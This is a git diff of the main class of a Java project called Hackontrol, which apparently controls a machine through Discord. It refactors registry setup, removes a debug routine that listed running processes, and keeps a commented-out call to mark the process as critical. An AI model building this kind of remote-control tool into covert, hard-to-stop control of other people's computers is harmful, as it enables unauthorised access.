@@ -1,19 +1,19 @@
 package com.khopan.hackontrol;
 
-import java.lang.Thread.UncaughtExceptionHandler;
-import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import com.khopan.hackontrol.logger.HackontrolLoggerConfig;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.registration.ChannelRegistry;
 import com.khopan.hackontrol.registration.ManagerRegistry;
+import com.khopan.hackontrol.registry.ClassRegistration;
 import com.khopan.hackontrol.registry.RegistrationHandler;
 import com.khopan.hackontrol.registry.RegistryType;
-import com.khopan.hackontrol.registry.implementation.StrictClassValueOnlyRegistryImplementation;
+import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.utils.ErrorHandler;
 
 import net.dv8tion.jda.api.JDA;
@@ -40,7 +40,6 @@ public class Hackontrol {
 		LOGGER = LoggerFactory.getLogger("Hackontrol");
 	}
 
-	private final UncaughtExceptionHandler defaultHandler;
 	private final List<Manager> managerList;
 	private final List<HackontrolChannel> channelList;
 	private final RegistrationHandler registrationHandler;
@@ -53,14 +52,11 @@ public class Hackontrol {
 
 	private Hackontrol() {
 		Hackontrol.INSTANCE = this;
-		this.defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
 		Thread.setDefaultUncaughtExceptionHandler(this :: handleError);
-		StrictClassValueOnlyRegistryImplementation<Manager> managerRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.MANAGER_REGISTRY, Manager.class);
-		ManagerRegistry.register(managerRegistryImplementation);
-		this.managerList = managerRegistryImplementation.getList();
-		StrictClassValueOnlyRegistryImplementation<HackontrolChannel> channelRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.CHANNEL_REGISTRY, HackontrolChannel.class);
-		ChannelRegistry.register(channelRegistryImplementation);
-		this.channelList = channelRegistryImplementation.getList();
+		ManagerRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MANAGER_REGISTRY));
+		ChannelRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.CHANNEL_REGISTRY));
+		this.managerList = ClassRegistration.list(null, Hackontrol.MANAGER_REGISTRY);
+		this.channelList = ClassRegistration.list(null, Hackontrol.CHANNEL_REGISTRY);
 
 		for(int i = 0; i < this.channelList.size(); i++) {
 			HackontrolChannel channel = this.channelList.get(i);
@@ -95,7 +91,6 @@ public class Hackontrol {
 			channel.preInitialize(this.registrationHandler.createRegistry(channel));
 
 			if(this.isChannelEmpty(textChannel)) {
-				Hackontrol.LOGGER.info("Channel #{} empty", textChannel.getName());
 				channel.initialize();
 			}
 
@@ -148,7 +143,7 @@ public class Hackontrol {
 
 	private void handleError(Thread thread, Throwable Errors) {
 		if(this.handler == null) {
-			this.defaultHandler.uncaughtException(thread, Errors);
+			Errors.printStackTrace();
 			return;
 		}
 
@@ -244,22 +239,9 @@ public class Hackontrol {
 
 	public static void main(String[] args) throws Throwable {
 		//NativeLibrary.critical(true); Prevent accidentally running the code
-		/*HackontrolLoggerConfig.disableDebug();
+		HackontrolLoggerConfig.disableDebug();
 		Hackontrol.LOGGER.info("Initializing");
-		Hackontrol.getInstance();*/
-		System.out.println("Current: " + NativeLibrary.currentIdentifier());
-		List<ProcessEntry> processList = new ArrayList<>();
-		processList.addAll(List.of(NativeLibrary.listProcess()));
-		processList.sort((x, y) -> x.executableFile.compareToIgnoreCase(y.executableFile));
-
-		if(processList == null || processList.isEmpty()) {
-			return;
-		}
-
-		for(int i = 0; i < processList.size(); i++) {
-			ProcessEntry process = processList.get(i);
-			System.out.println(process.executableFile + " " + process.processIdentifier);
-		}
+		Hackontrol.getInstance();
 	}
 
 	public static Hackontrol getInstance() {
